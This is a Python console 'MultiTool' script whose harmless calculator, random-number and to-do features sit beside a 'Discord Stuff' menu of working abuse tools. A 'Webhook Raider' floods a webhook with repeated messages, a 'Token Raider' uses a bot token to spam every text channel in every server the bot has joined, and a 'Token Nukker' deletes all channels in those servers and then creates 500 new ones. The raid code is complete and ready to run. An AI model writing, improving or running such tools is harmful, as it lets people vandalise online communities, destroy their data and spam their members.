import os
import random
import requests

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def calculator():
    clear_console()
    print("========== Calculator ==========")
    try:
        num1 = float(input("Enter first number: "))
        op = input("Enter operation (+, -, *, /): ")
        num2 = float(input("Enter second number: "))

        if op == '+':
            print(f"Result: {num1 + num2}")
        elif op == '-':
            print(f"Result: {num1 - num2}")
        elif op == '*':
            print(f"Result: {num1 * num2}")
        elif op == '/':
            if num2 != 0:
                print(f"Result: {num1 / num2}")
            else:
                print("Error: Cannot divide by zero.")
        else:
            print("Error: Invalid operation.")
    except ValueError:
        print("Error: Invalid input.")
    input("\nPress Enter to return to the menu...")

def random_number_generator():
    clear_console()
    print("===== Random Number Generator =====")
    try:
        lower_bound = int(input("Enter lower bound: "))
        upper_bound = int(input("Enter upper bound: "))
        if lower_bound > upper_bound:
            print("Error: Lower bound should be less than or equal to upper bound.")
        else:
            print(f"Generated random number: {random.randint(lower_bound, upper_bound)}")
    except ValueError:
        print("Error: Please enter valid integers.")
    input("\nPress Enter to return to the menu...")

def todo_list():
    clear_console()
    print("========= To-Do List =========")
    todos = []
    while True:
        clear_console()
        print("========= To-Do List =========")
        print("\n1. View To-Do List")
        print("2. Add To-Do")
        print("3. Remove To-Do")
        print("4. Exit To-Do List")
        choice = input("\nChoose an option: ")

        if choice == '1':
            clear_console()
            print("========= Your To-Do List =========")
            if todos:
                for idx, todo in enumerate(todos, start=1):
                    print(f"{idx}. {todo}")
            else:
                print("Your to-do list is empty.")
            input("\nPress Enter to return...")
        elif choice == '2':
            todo = input("Enter a new to-do: ")
            todos.append(todo)
            print(f"'{todo}' added to your to-do list.")
            input("\nPress Enter to continue...")
        elif choice == '3':
            try:
                todo_idx = int(input("Enter the number of the to-do to remove: ")) - 1
                if 0 <= todo_idx < len(todos):
                    removed_todo = todos.pop(todo_idx)
                    print(f"'{removed_todo}' removed from your to-do list.")
                else:
                    print("Error: Invalid number.")
            except ValueError:
                print("Error: Please enter a valid number.")
            input("\nPress Enter to continue...")
        elif choice == '4':
            break
        else:
            print("Error: Invalid choice. Please choose a valid option.")
            input("\nPress Enter to continue...")

def webhook_raider():
    clear_console()
    print("======= Webhook Raider =======")
    webhook_url = input("Enter the Discord Webhook URL: ")
    message = input("Enter the message to send: ")
    try:
        count = int(input("Enter the number of messages to send: "))
    except ValueError:
        print("Error: Please enter a valid number.")
        input("\nPress Enter to return...")
        return

    for i in range(count):
        response = requests.post(webhook_url, json={"content": message})
        if response.status_code == 204:
            print(f"Message {i+1}/{count} sent successfully.")
        else:
            print(f"Error: Failed to send message {i+1}/{count}. HTTP Status Code: {response.status_code}")

    input("\nPress Enter to return to the menu...")

def token_raider():
    clear_console()
    print("======= Token Raider =======")
    bot_token = input("Enter the Discord Bot Token: ")
    message = input("Enter the message to send: ")
    try:
        count = int(input("Enter the number of messages to send to each channel: "))
    except ValueError:
        print("Error: Please enter a valid number.")
        input("\nPress Enter to return...")
        return

    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }

    # Fetch guilds the bot is in
    guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    if guilds_response.status_code != 200:
        print(f"Error: Failed to fetch guilds. HTTP Status Code: {guilds_response.status_code}")
        input("\nPress Enter to return...")
        return

    guilds = guilds_response.json()

    for guild in guilds:
        guild_id = guild['id']
        
        # Fetch channels in the guild
        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if channels_response.status_code != 200:
            print(f"Error: Failed to fetch channels for guild {guild_id}. HTTP Status Code: {channels_response.status_code}")
            continue

        channels = channels_response.json()

        for channel in channels:
            if channel['type'] == 0:  # Ensure the channel is a text channel (type 0)
                channel_id = channel['id']
                for i in range(count):
                    response = requests.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        json={"content": message},
                        headers=headers
                    )
                    if response.status_code == 200:
                        print(f"Message {i+1}/{count} sent successfully to channel {channel_id} in guild {guild_id}.")
                    else:
                        print(f"Error: Failed to send message {i+1}/{count} to channel {channel_id} in guild {guild_id}. HTTP Status Code: {response.status_code}")

    input("\nPress Enter to return to the menu...")

def token_nukker():
    clear_console()
    print("======= Token Nukker =======")
    bot_token = input("Enter the Discord Bot Token: ")
    new_channel_name = input("Enter the new channel name to create: ")

    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }

    # Fetch guilds the bot is in
    guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    if guilds_response.status_code != 200:
        print(f"Error: Failed to fetch guilds. HTTP Status Code: {guilds_response.status_code}")
        input("\nPress Enter to return...")
        return

    guilds = guilds_response.json()

    for guild in guilds:
        guild_id = guild['id']
        
        # Fetch channels in the guild
        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if channels_response.status_code != 200:
            print(f"Error: Failed to fetch channels for guild {guild_id}. HTTP Status Code: {channels_response.status_code}")
            continue

        channels = channels_response.json()

        # Delete all channels
        for channel in channels:
            channel_id = channel['id']
            delete_response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
            if delete_response.status_code == 204:
                print(f"Deleted channel {channel_id} in guild {guild_id}.")
            else:
                print(f"Error: Failed to delete channel {channel_id} in guild {guild_id}. HTTP Status Code: {delete_response.status_code}")

        # Create 500 new channels
        for i in range(500):
            create_response = requests.post(
                f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                json={"name": new_channel_name, "type": 0},
                headers=headers
            )
            if create_response.status_code == 201:
                print(f"Created channel {new_channel_name} in guild {guild_id}.")
            else:
                print(f"Error: Failed to create channel {new_channel_name} in guild {guild_id}. HTTP Status Code: {create_response.status_code}")

    input("\nPress Enter to return to the menu...")

def discord_stuff():
    while True:
        clear_console()
        print("=========== Discord Stuff ===========")
        print("| 1. Webhook Raider                  |")
        print("| 2. Token Raider                    |")
        print("| 3. Token Nukker                    |")
        print("| 4. Back to Main Menu               |")
        print("=====================================")
        choice = input("Choose an option (1-4): ")

        if choice == '1':
            webhook_raider()
        elif choice == '2':
            token_raider()
        elif choice == '3':
            token_nukker()
        elif choice == '4':
            break
        else:
            print("Error: Invalid choice. Please choose a valid option.")
            input("\nPress Enter to continue...")

def main_menu():
    while True:
        clear_console()
        print("=========== MultiTool ===========")
        print("| 1. Calculator                 |")
        print("| 2. Random Number Generator    |")
        print("| 3. To-Do List                 |")
        print("| 4. Discord Stuff              |")
        print("| 5. Exit                       |")
        print("=================================")
        choice = input("Choose an option (1-5): ")

        if choice == '1':
            calculator()
        elif choice == '2':
            random_number_generator()
        elif choice == '3':
            todo_list()
        elif choice == '4':
            discord_stuff()
        elif choice == '5':
            break
        else:
            print("Error: Invalid choice. Please choose a valid option.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main_menu()
